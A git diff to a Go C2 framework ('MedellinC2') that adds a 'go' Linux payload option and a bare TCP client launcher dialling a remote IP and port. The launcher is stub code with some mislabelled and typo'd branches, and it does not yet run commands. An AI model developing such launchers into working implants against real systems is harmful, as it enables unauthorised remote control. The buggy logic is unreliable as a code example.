@@ -5,9 +5,12 @@ Copyright © 2022 NAME HERE <EMAIL ADDRESS>
 package cmd
 
 import (
+	"bufio"
 	"errors"
 	"fmt"
+	"net"
 	"os"
+	"strings"
 
 	"github.com/manifoldco/promptui"
 	"github.com/megatop1/MedellinC2/data"
@@ -112,8 +115,9 @@ func createLinuxPayload() {
 	data.InsertLauncher(remoteIP, listener, listenerIP, remotePort, remoteIP, jitter)
 
 	if payloadType != "" {
-		if payloadType == "bash" {
+		if payloadType == "go" {
 			print("generating bash launcher...\n")
+			goLauncher(remoteIP, remotePort)
 		} else if payloadType == "executab;e" {
 			print("generating executable launcher...\n")
 			//powershellLauncher(remoteIP, remotePort)
@@ -123,6 +127,8 @@ func createLinuxPayload() {
 			print("generating reverse_ssh launcher...\n")
 		} else if payloadType == "socat" {
 			print("generating socat launcher...\n")
+		} else if payloadType == "bash" {
+			print("generating bash launcher...\n")
 		}
 	}
 
@@ -130,7 +136,7 @@ func createLinuxPayload() {
 }
 
 func promptLinuxSelect(pc promptContent) string {
-	payloads := []string{"bash", "executable", "python", "perl", "reverse_ssh", "socat"}
+	payloads := []string{"go", "executable", "python", "perl", "reverse_ssh", "socat", "bash"}
 	index := -1 //keeps prompt open until user chooses a choice
 
 	var result string
@@ -160,6 +166,29 @@ func promptLinuxSelect(pc promptContent) string {
 
 func bashLauncher() {
 
+}
+
+func goLauncher(remoteIP string, remotePort string) {
+	//CONNECT := arguments[1]
+	c, err := net.Dial("tcp", remoteIP+":"+remotePort)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+
+	for {
+		reader := bufio.NewReader(os.Stdin)
+		fmt.Print(">> ")
+		text, _ := reader.ReadString('\n')
+		fmt.Fprintf(c, text+"\n")
+
+		message, _ := bufio.NewReader(c).ReadString('\n')
+		fmt.Print("->: " + message)
+		if strings.TrimSpace(string(text)) == "STOP" {
+			fmt.Println("TCP client exiting...")
+			return
+		}
+	}
 }
 
 func executableLauncher() {
